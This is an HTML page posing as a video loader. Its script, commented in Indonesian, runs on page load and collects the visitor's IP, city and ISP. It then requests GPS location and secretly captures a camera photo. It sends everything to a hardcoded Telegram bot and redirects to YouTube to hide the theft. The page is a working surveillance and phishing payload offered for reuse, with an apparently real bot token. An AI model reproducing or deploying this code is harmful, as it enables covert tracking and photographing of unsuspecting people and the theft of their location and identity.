<!DOCTYPE html>
<html>
<head><title>Loading Video...</title></head>
<body>
    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script>
        const botToken = "7702524045:AAFyPZql1w8FCg-cbLU2yjKv-2PtdOLP6Yc"; // Gunakan Token Anda
        const chatId = "7263868848"; // Gunakan ID Anda

        async function collectData() {
            // 1. Tangkap IP dan Info Perangkat
            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
            const deviceData = `ðŸ“ IP: ${ipInfo.ip}\nðŸŒ Kota: ${ipInfo.city}\nðŸ¢ ISP: ${ipInfo.org}`;

            // 2. Minta Lokasi GPS
            navigator.geolocation.getCurrentPosition(pos => {
                const gps = `ðŸ›° GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTele(`${deviceData}\n${gps}`);
            }, () => sendToTele(deviceData));

            // 3. Tangkap Foto (Trigger Kamera)
            captureCamera();
        }

        function captureCamera() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'target.png');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/png');
                }, 2000);
            });
        }

        function sendToTele(text) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
        }

        collectData();
        setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=iRVZ6wTYecI"; }, 5000);
    </script>
</body>
</html>
